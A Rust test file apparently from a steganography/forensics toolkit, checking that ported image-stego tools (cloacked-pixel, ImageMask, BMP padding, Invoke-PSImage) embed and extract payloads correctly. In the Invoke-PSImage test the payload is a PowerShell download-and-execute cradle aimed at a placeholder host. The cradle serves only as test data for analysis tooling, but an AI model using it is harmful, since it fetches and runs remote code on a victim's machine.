//! Tests for the ported third-party image-stego tools (cloacked-pixel, ImageMask,
//! BMP 填补字节, stegpy, Invoke-PSImage, Brainloller/Braincopter, PixelJihad).

use std::collections::HashMap;
use std::io::Cursor;
use std::sync::Arc;

use image::{ImageFormat, Rgb, RgbImage, Rgba, RgbaImage};
use misclab_core::cancel::CancellationToken;
use misclab_core::graph::executor::GraphExecutor;
use misclab_core::graph::port::PortValue;
use misclab_core::node::PortMap;
use misclab_core::nodes::default_registry;
use misclab_core::progress::NullSink;
use serde_json::json;

fn png(img: &RgbaImage) -> Vec<u8> {
    let mut b = Vec::new();
    img.write_to(&mut Cursor::new(&mut b), ImageFormat::Png)
        .unwrap();
    b
}
fn cover(w: u32, h: u32) -> RgbaImage {
    RgbaImage::from_fn(w, h, |x, y| {
        Rgba([
            (x.wrapping_mul(7).wrapping_add(y) & 0xff) as u8,
            (y.wrapping_mul(13).wrapping_add(x * 2) & 0xff) as u8,
            (x ^ y).wrapping_mul(5) as u8,
            255,
        ])
    })
}
fn run(id: &str, ports: &[(&str, PortValue)], params: serde_json::Value) -> PortMap {
    let reg = default_registry();
    let mut m = HashMap::new();
    for (k, v) in ports {
        m.insert(k.to_string(), v.clone());
    }
    GraphExecutor::run_node(&reg, id, &m, &params, &NullSink, &CancellationToken::new()).unwrap()
}
fn try_run(
    id: &str,
    ports: &[(&str, PortValue)],
    params: serde_json::Value,
) -> Result<PortMap, String> {
    let reg = default_registry();
    let mut m = HashMap::new();
    for (k, v) in ports {
        m.insert(k.to_string(), v.clone());
    }
    GraphExecutor::run_node(&reg, id, &m, &params, &NullSink, &CancellationToken::new())
        .map_err(|e| e.to_string())
}
fn bytes_of(m: &PortMap, port: &str) -> Vec<u8> {
    match m.get(port) {
        Some(PortValue::Bytes(b)) => b.to_vec(),
        other => panic!("expected Bytes at '{port}', got {other:?}"),
    }
}
fn text_of(m: &PortMap, port: &str) -> String {
    match m.get(port) {
        Some(PortValue::Text(s)) => s.clone(),
        other => panic!("expected Text at '{port}', got {other:?}"),
    }
}
fn img_bytes(img: &RgbaImage) -> PortValue {
    PortValue::Bytes(Arc::from(png(img).into_boxed_slice()))
}
fn raw(b: &[u8]) -> PortValue {
    PortValue::Bytes(Arc::from(b.to_vec().into_boxed_slice()))
}

// ============================================================ cloacked-pixel
#[test]
fn cloacked_pixel_roundtrip() {
    let payload = b"flag{cloacked_pixel_\x00\xff_test}".to_vec();
    let emb = run(
        "cloacked_pixel_embed",
        &[("data", img_bytes(&cover(64, 64))), ("file", raw(&payload))],
        json!({ "password": "hunter2" }),
    );
    let stego = bytes_of(&emb, "bytes");
    let out = run(
        "cloacked_pixel_extract",
        &[("data", raw(&stego))],
        json!({ "password": "hunter2" }),
    );
    assert_eq!(bytes_of(&out, "bytes"), payload);
}

#[test]
fn cloacked_pixel_wrong_password_fails() {
    let emb = run(
        "cloacked_pixel_embed",
        &[
            ("data", img_bytes(&cover(48, 48))),
            ("file", raw(b"secret")),
        ],
        json!({ "password": "right" }),
    );
    let stego = bytes_of(&emb, "bytes");
    // Wrong password → padding/decrypt fails → node errors.
    assert!(try_run(
        "cloacked_pixel_extract",
        &[("data", raw(&stego))],
        json!({ "password": "wrong" })
    )
    .is_err());
}

// ================================================================= ImageMask
#[test]
fn imagemask_text_roundtrip() {
    let secret = "flag{image_mask_文本}";
    for mix in [1.0, 2.0, 3.0] {
        let emb = run(
            "imagemask_text_embed",
            &[("data", img_bytes(&cover(64, 64)))],
            json!({ "text": secret, "mixCount": mix }),
        );
        let stego = bytes_of(&emb, "bytes");
        let out = run(
            "imagemask_text_extract",
            &[("data", raw(&stego))],
            json!({ "mixCount": mix }),
        );
        assert_eq!(text_of(&out, "text"), secret, "mix={mix}");
    }
}

#[test]
fn imagemask_file_roundtrip() {
    let payload = b"PK\x03\x04 imagemask file body \x00\xff".to_vec();
    let emb = run(
        "imagemask_file_embed",
        &[("data", img_bytes(&cover(80, 80))), ("file", raw(&payload))],
        json!({ "filename": "个人.zip", "mixCount": 2 }),
    );
    let stego = bytes_of(&emb, "bytes");
    let out = run(
        "imagemask_file_extract",
        &[("data", raw(&stego))],
        json!({ "mixCount": 2 }),
    );
    assert_eq!(text_of(&out, "filename"), "个人.zip");
    assert_eq!(bytes_of(&out, "bytes"), payload);
}

// ============================================================ BMP 填补字节
#[test]
fn bmp_padding_roundtrip() {
    // 24-bit BMP, width 13 → 13*3=39 → stride 40 → 1 pad byte/row × 10 rows = 10 bytes.
    let img = RgbImage::from_fn(13, 10, |x, y| {
        Rgb([(x * 9) as u8, (y * 7) as u8, (x + y) as u8])
    });
    let mut bmp = Vec::new();
    img.write_to(&mut Cursor::new(&mut bmp), ImageFormat::Bmp)
        .unwrap();

    let payload = b"flag!!"; // 6 bytes, fits in 10
    let emb = run(
        "bmp_padding_embed",
        &[("data", raw(&bmp)), ("file", raw(payload))],
        json!({}),
    );
    let stego = bytes_of(&emb, "bytes");
    let out = run("bmp_padding_extract", &[("data", raw(&stego))], json!({}));
    let ex = bytes_of(&out, "bytes");
    assert_eq!(&ex[..payload.len()], payload, "padding-extracted prefix");
    // The image pixels must be untouched (only padding changed).
    assert_eq!(
        image::load_from_memory(&stego).unwrap().to_rgb8(),
        img,
        "pixels unchanged"
    );
}

// ============================================================ Invoke-PSImage
#[test]
fn psimage_roundtrip() {
    let script =
        b"IEX(New-Object Net.WebClient).DownloadString('http://x/y');Write-Host 'flag{psimage}'";
    let emb = run(
        "psimage_embed",
        &[("data", img_bytes(&cover(64, 64))), ("file", raw(script))],
        json!({}),
    );
    let stego = bytes_of(&emb, "bytes");
    // trim=false: exact nibble decode of the first script.len() bytes.
    let out = run(
        "psimage_extract",
        &[("data", raw(&stego))],
        json!({ "trim": false }),
    );
    assert_eq!(&bytes_of(&out, "bytes")[..script.len()], &script[..]);
    // trim=true: recovers the readable script prefix.
    let trimmed = run(
        "psimage_extract",
        &[("data", raw(&stego))],
        json!({ "trim": true }),
    );
    assert!(text_of(&trimmed, "text").starts_with("IEX(New-Object"));
}
